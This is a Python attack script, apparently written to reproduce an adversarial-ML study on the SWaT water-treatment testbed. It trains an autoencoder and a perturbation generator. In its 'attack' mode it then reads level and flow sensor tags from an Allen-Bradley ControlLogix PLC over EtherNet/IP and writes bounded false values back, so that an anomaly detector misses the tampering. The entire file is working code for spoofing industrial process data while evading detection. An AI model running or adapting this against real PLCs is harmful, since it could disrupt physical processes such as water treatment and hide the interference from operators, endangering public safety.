#!/usr/bin/env python3
"""
phase2_spoof.py  —  SWaT Phase 2: Adversarial ML Evasion (Paper #31)
Target: Allen-Bradley ControlLogix PLC1 over EtherNet/IP

Reads live tag values from PLC1 via pycomm3, applies adversarial
perturbations (constrained to ||delta||_inf <= epsilon) to evade the
reconstruction-based autoencoder detector, then writes perturbed
analog values back to PLC1 tags.

Modes:
  train  — train adversarial autoencoder on SWaT normal CSV
  attack — run live adversarial perturbation against PLC1

Usage:
  python3 phase2_spoof.py train  --data swat_normal.csv --epochs 100
  python3 phase2_spoof.py attack --plc-ip 192.168.0.10 --iface eth0 --duration 120
"""

import argparse, time, signal, sys
import numpy as np
import pandas as pd
import torch
import torch.nn as nn
from pycomm3 import LogixDriver, PycommException

EPSILON = 0.1    # ||delta||_inf constraint (Paper #31 Section 4)
FEATURES = ['LIT101', 'FIT101']   # Analog tags to perturb (REAL type)

# Tag paths for analog reads/writes on ControlLogix
ANALOG_TAG_PATHS = {
    'LIT101': 'HMI_LIT101:I.Data',
    'FIT101': 'HMI_FIT101:I.Data',
}

stop_flag = False


# ── Autoencoder ───────────────────────────────────────────────────────────────
class Autoencoder(nn.Module):
    def __init__(self, input_dim, latent_dim=8):
        super().__init__()
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 32), nn.ReLU(),
            nn.Linear(32, 16),        nn.ReLU(),
            nn.Linear(16, latent_dim)
        )
        self.decoder = nn.Sequential(
            nn.Linear(latent_dim, 16), nn.ReLU(),
            nn.Linear(16, 32),         nn.ReLU(),
            nn.Linear(32, input_dim)
        )

    def forward(self, x):
        return self.decoder(self.encoder(x))


# ── Adversarial Autoencoder (generates perturbation delta) ───────────────────
class AdversarialEncoder(nn.Module):
    """Generates delta such that AE(x + delta) looks normal."""
    def __init__(self, input_dim, epsilon=EPSILON):
        super().__init__()
        self.epsilon = epsilon
        self.net = nn.Sequential(
            nn.Linear(input_dim, 32), nn.Tanh(),
            nn.Linear(32, 32),        nn.Tanh(),
            nn.Linear(32, input_dim), nn.Tanh()
        )

    def forward(self, x):
        delta = self.net(x) * self.epsilon   # clamp to [-eps, +eps]
        return torch.clamp(delta, -self.epsilon, self.epsilon)


def train(data_path, model_path, ae_path, epochs=100, window=10):
    print(f"[*] Loading SWaT normal data: {data_path}")
    df = pd.read_csv(data_path)

    # Normalise
    feat_cols = [c for c in FEATURES if c in df.columns]
    if not feat_cols:
        print(f"[!] None of {FEATURES} found in CSV. Available: {list(df.columns[:10])}")
        sys.exit(1)

    data = df[feat_cols].dropna().values.astype(np.float32)
    mu, sigma = data.mean(0), data.std(0) + 1e-8
    data_norm = (data - mu) / sigma

    # Sliding window
    X = np.stack([data_norm[i:i+window] for i in range(len(data_norm)-window)])
    X_flat = X.reshape(len(X), -1)
    X_t = torch.tensor(X_flat)

    input_dim = X_flat.shape[1]
    ae  = Autoencoder(input_dim)
    adv = AdversarialEncoder(input_dim)
    opt_ae  = torch.optim.Adam(ae.parameters(),  lr=1e-3)
    opt_adv = torch.optim.Adam(adv.parameters(), lr=1e-3)
    mse = nn.MSELoss()

    print(f"[*] Training AE + AdversarialEncoder  epochs={epochs}  input_dim={input_dim}")
    for epoch in range(1, epochs+1):
        # Train AE to reconstruct normal data
        ae.train(); adv.eval()
        opt_ae.zero_grad()
        recon = ae(X_t)
        loss_ae = mse(recon, X_t)
        loss_ae.backward(); opt_ae.step()

        # Train AdversarialEncoder to minimise AE reconstruction error on perturbed data
        ae.eval(); adv.train()
        opt_adv.zero_grad()
        delta = adv(X_t)
        x_adv = X_t + delta
        recon_adv = ae(x_adv)
        loss_adv = mse(recon_adv, X_t)   # want AE to see perturbed as normal
        loss_adv.backward(); opt_adv.step()

        if epoch % 10 == 0:
            print(f"    Epoch {epoch:4d}/{epochs}  AE loss={loss_ae.item():.6f}  "
                  f"Adv loss={loss_adv.item():.6f}")

    torch.save({'ae': ae.state_dict(), 'adv': adv.state_dict(),
                'mu': mu, 'sigma': sigma, 'window': window,
                'feat_cols': feat_cols, 'input_dim': input_dim}, model_path)
    print(f"[+] Models saved: {model_path}")


def attack(plc_ip, model_path, duration):
    global stop_flag
    print(f"[*] Loading models from {model_path}")
    ckpt = torch.load(model_path, map_location='cpu')
    ae  = Autoencoder(ckpt['input_dim']);  ae.load_state_dict(ckpt['ae']);  ae.eval()
    adv = AdversarialEncoder(ckpt['input_dim']); adv.load_state_dict(ckpt['adv']); adv.eval()
    mu, sigma = ckpt['mu'], ckpt['sigma']
    window, feat_cols = ckpt['window'], ckpt['feat_cols']

    print(f"[*] Adversarial attack starting -> PLC {plc_ip}  duration={duration}s")
    print(f"    Tags: {feat_cols}  epsilon={EPSILON}")

    tag_paths = [ANALOG_TAG_PATHS[f] for f in feat_cols if f in ANALOG_TAG_PATHS]
    history = []
    end_time = time.time() + duration
    cycle = 0

    try:
        with LogixDriver(plc_ip) as plc:
            while not stop_flag and time.time() < end_time:
                # Read current analog tag values from PLC
                results = plc.read(*tag_paths)
                if not isinstance(results, list):
                    results = [results]
                raw_vals = np.array([r.value for r in results], dtype=np.float32)

                # Normalise
                norm_vals = (raw_vals - mu) / sigma
                history.append(norm_vals)
                if len(history) < window:
                    time.sleep(1.0)
                    continue
                history = history[-window:]

                # Build window tensor
                x = torch.tensor(np.array(history).flatten(), dtype=torch.float32).unsqueeze(0)

                # Generate perturbation
                with torch.no_grad():
                    delta = adv(x).squeeze().numpy()

                # Apply delta to last time step only, de-normalise
                delta_last = delta[-(len(feat_cols)):]
                perturbed_norm = norm_vals + delta_last
                perturbed_vals = perturbed_norm * sigma + mu

                # Write perturbed values back to PLC analog tags
                writes = [(path, float(val)) for path, val in zip(tag_paths, perturbed_vals)]
                plc.write(*writes)

                cycle += 1
                if cycle % 5 == 0:
                    for f, orig, pert in zip(feat_cols, raw_vals, perturbed_vals):
                        print(f"    [adv {cycle:4d}] {f}: {orig:.3f} -> {pert:.3f}  "
                              f"(delta={pert-orig:+.4f})")

                time.sleep(1.0)
    except PycommException as e:
        print(f"[!] EtherNet/IP error: {e}")
    print(f"[+] Phase 2 complete. {cycle} adversarial cycles.")


def signal_handler(sig, frame):
    global stop_flag
    print("\n[!] Stopping phase 2...")
    stop_flag = True

def main():
    signal.signal(signal.SIGINT, signal_handler)
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest='mode', required=True)

    tr = sub.add_parser('train')
    tr.add_argument('--data',   required=True, help='SWaT normal CSV path')
    tr.add_argument('--model',  default='adv_model.pt')
    tr.add_argument('--epochs', type=int, default=100)
    tr.add_argument('--window', type=int, default=10)

    at = sub.add_parser('attack')
    at.add_argument('--plc-ip',   required=True)
    at.add_argument('--iface',    default='eth0')
    at.add_argument('--model',    default='adv_model.pt')
    at.add_argument('--duration', type=int, default=120)

    args = ap.parse_args()
    if args.mode == 'train':
        train(args.data, args.model, args.model, args.epochs, args.window)
    else:
        attack(args.plc_ip, args.model, args.duration)

if __name__ == '__main__':
    main()
